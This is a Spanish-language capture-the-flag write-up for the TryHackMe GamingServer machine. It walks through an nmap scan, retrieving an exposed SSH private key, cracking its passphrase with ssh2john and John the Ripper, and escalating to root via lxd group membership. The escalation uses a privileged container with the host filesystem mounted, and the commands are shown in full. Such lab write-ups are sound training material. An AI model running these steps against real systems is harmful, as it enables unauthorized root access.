---
layout: single
title: Writeup THM - GamingServer
comments: true
excerpt: "La maquina GaminServer es una maquina linux - Easy, encontramos una pagina web donde encontramos en el directorio secret un archivo llamado secretKey que nos servira para crackear con ssh2john obteniendo el passphrase que nos permitira accediendo por ssh con dicha secretKey, escalamos privilegios a root ya que nuestro usuario john pertenece al grupo lxd."
date: 2022-02-10
classes: wide
header:
  teaser: /assets/images/2022-02-10-writeup-maquina-thm-gamingserver/Untitled.png
  teaser_home_page: true
categories:
  - HackTheBox
tags:
  - OSCP  
  - Hacking
  - Easy
  - ssh
  - id_rsa
  - ssh2john
  - john 
  - lxd
---

# GamingServer
<p align="center">
<img src="/assets/images/2022-02-10-writeup-maquina-thm-gamingserver/Untitled.png">
</p>

## Resumen
<div style="text-align: justify">
La maquina GaminServer es una maquina linux - Easy, encontramos una pagina web donde encontramos en el directorio secret un archivo llamado secretKey que nos servira para crackear con ssh2john obteniendo el passphrase que nos permitira accediendo por ssh con dicha secretKey, escalamos privilegios a root ya que nuestro usuario john pertenece al grupo lxd.
</div>

## Scan Nmap

```bash
# Nmap 7.92 scan initiated Wed Feb  9 16:56:28 2022 as: nmap -sC -sV -p22,80 -oN targeted -Pn -vvv 10.10.95.120
Nmap scan report for 10.10.79.255
Host is up, received user-set (0.19s latency).
Scanned at 2022-02-09 16:56:29 -05 for 14s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCrmafoLXloHrZgpBrYym3Lpsxyn7RI2PmwRwBsj1OqlqiGiD4wE11NQy3KE3Pllc/C0WgLBCAAe+qHh3VqfR7d8uv1MbWx1mvmVxK8l29UH1rNT4mFPI3Xa0xqTZn4Iu5RwXXuM4H9OzDglZas6RIm6Gv+sbD2zPdtvo9zDNj0BJClxxB/SugJFMJ+nYfYHXjQFq+p1xayfo3YIW8tUIXpcEQ2kp74buDmYcsxZBarAXDHNhsEHqVry9I854UWXXCdbHveoJqLV02BVOqN3VOw5e1OMTqRQuUvM5V4iKQIUptFCObpthUqv9HeC/l2EZzJENh+PmaRu14izwhK0mxL
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEaXrFDvKLfEOlKLu6Y8XLGdBuZ2h/sbRwrHtzsyudARPC9et/zwmVaAR9F/QATWM4oIDxpaLhA7yyh8S8m0UOg=
|   256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOLrnjg+MVLy+IxVoSmOkAtdmtSWG0JzsWVDV2XvNwrY
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: House of danak
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb  9 16:56:43 2022 -- 1 IP address (1 host up) scanned in 14.77 seconds
```

## Pagina web - Port 80

revisamos la pagina web, vemos que una pagina relacionado a un tipo de juego

![Untitled](/assets/images/2022-02-10-writeup-maquina-thm-gamingserver/Untitled%201.png)

si revisamos robos.txt vemos que existe un directorio uploads

![Untitled](/assets/images/2022-02-10-writeup-maquina-thm-gamingserver/Untitled%202.png)

si vamos a uploads, vemos que podemos acceder a

```bash
- dict.lst  -> diccionario de password
- manifesto.txt -> relato 
- meme.jpg -> imagen
```

![Untitled](/assets/images/2022-02-10-writeup-maquina-thm-gamingserver/Untitled%203.png)

tambien revisamos el directorio secret y que tenemos un archivo llamado secretKey

![Untitled](/assets/images/2022-02-10-writeup-maquina-thm-gamingserver/Untitled%204.png)

todo parece indicar que secretKey es un llave privada para conectarnos por ssh

![Untitled](/assets/images/2022-02-10-writeup-maquina-thm-gamingserver/Untitled%205.png)

guardamos secretkey como id_rsa e intentamos conectarnos por ssh pero lamentablemente nos pide passphrase

```bash
GamingServer # ❯ ssh -i id_rsa john@10.10.232.84
```

![Untitled](/assets/images/2022-02-10-writeup-maquina-thm-gamingserver/Untitled%206.png)

por lo tanto crackearemos con ssh2john y john the ripper para obtener el passphrase

```bash
GamingServer # ❯ ssh2john id_rsa > id_rsa.hash
GamingServer # ❯ john id_rsa.hash -wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 6 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (id_rsa)
1g 0:00:00:38 DONE (2022-02-09 18:26) 0.02626g/s 376719p/s 376719c/s 376719C/s     1990..*7¡Vamos!
Session completed
```

ahora que tenemos el passphrase que es letmein, nos conectamos por ssh

```bash
GamingServer # ❯ ssh -i id_rsa john@10.10.232.84
```

![Untitled](/assets/images/2022-02-10-writeup-maquina-thm-gamingserver/Untitled%207.png)

una vez conectados leeremos la flag del user.txt

![Untitled](/assets/images/2022-02-10-writeup-maquina-thm-gamingserver/Untitled%208.png)

## Escalacion de Privilegios - User Root

al ejecutar el comando id, vemos que pertenecemos al grupo lxd. Por lo tanto se me ocurre escalar por esta via

![Untitled](/assets/images/2022-02-10-writeup-maquina-thm-gamingserver/Untitled%209.png)

revisare un articulo de hacktricks 

```bash
https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation
```

asi que en mi maquina ejecutare dichos comandos

```bash
sudo su
#Install requirements
sudo apt update
sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
#Clone repo
sudo go get -d -v github.com/lxc/distrobuilder
#Make distrobuilder
cd $HOME/go/src/github.com/lxc/distrobuilder
make
#Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
#Create the container
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8
```

el resultado de ejecutar dichos comandos seran los lxd.tar.xz y rootfs.squashfs

![Untitled](/assets/images/2022-02-10-writeup-maquina-thm-gamingserver/Untitled%2010.png)

dichos archivos lo subiremos a la maquina victima para nos situaremos en la carpeta de estos archivos y crearemos nuestro servidor web de python

```bash
alpine # ❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

![Untitled](/assets/images/2022-02-10-writeup-maquina-thm-gamingserver/Untitled%2011.png)

descargamos los archivos en la maquina victima

![Untitled](/assets/images/2022-02-10-writeup-maquina-thm-gamingserver/Untitled%2012.png)

agregamos una imagen

```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list #You can see your new imported image
```

![Untitled](/assets/images/2022-02-10-writeup-maquina-thm-gamingserver/Untitled%2013.png)

creamos un container y agregamos la ruta del root

```bash
lxc init alpine privesc -c security.privileged=true
lxc list #List containers

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

ejecutamos el container

```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```

![Untitled](/assets/images/2022-02-10-writeup-maquina-thm-gamingserver/Untitled%2014.png)

gracias por leer este writeup, nos vemos AbelJM